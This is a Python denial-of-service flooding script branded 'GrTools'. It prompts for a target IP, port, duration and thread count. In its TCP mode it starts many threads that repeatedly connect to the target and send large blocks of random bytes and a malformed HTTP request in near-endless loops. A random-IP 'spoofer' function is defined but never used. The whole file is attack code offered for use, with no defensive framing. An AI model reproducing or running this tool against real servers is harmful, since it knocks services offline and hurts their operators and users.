import socket
import random
import datetime
import threading
import time

def spoofer():
    addr = [101, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assembled

expiration_date = datetime.datetime.now() + datetime.timedelta(days=7)

ip = input("\033[36m╔══\n╚══════>Server@GrTools~ Enter Target IP :\n ")
port = int(input("\033[36m╔══\n╚══════>Server@GrTools~ Input Port :\n "))
t = int(input("\033[36m╔══\n╚══════>Server@GrTools~ Input Times :\n "))
th = int(input("\033[36m╔══\n╚══════>Server@GrTools~ Input Thread :\n "))
method = input("╔══\n╚══════>Server@GrTools~~ Enter Methods :\n ")

if method == "TCP":
                
    def tcpfl():
        global useragents, socks3
        get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
        connection = "Connection: Keep-Alive\r\n" + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        request =  get_host + content + connection + "\r\n"
        grtools = random._urandom(50411)
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.connect((ip, port))
                sock.send(grtools)
                sock.sendall(str.encode(request))
                for _ in range(500000):
                    sock.send(grtools)
                    sock.sendall(str.encode(request))
                print("[!] Attacked ")
            except socket.error:
                print("[!] Attacked Slow ")
                sock.close()
        
                 
    for _ in range(th):
        if method == "TCP":
            t = threading.Thread(target=tcpfl)
            t.daemon = True
            t.start()


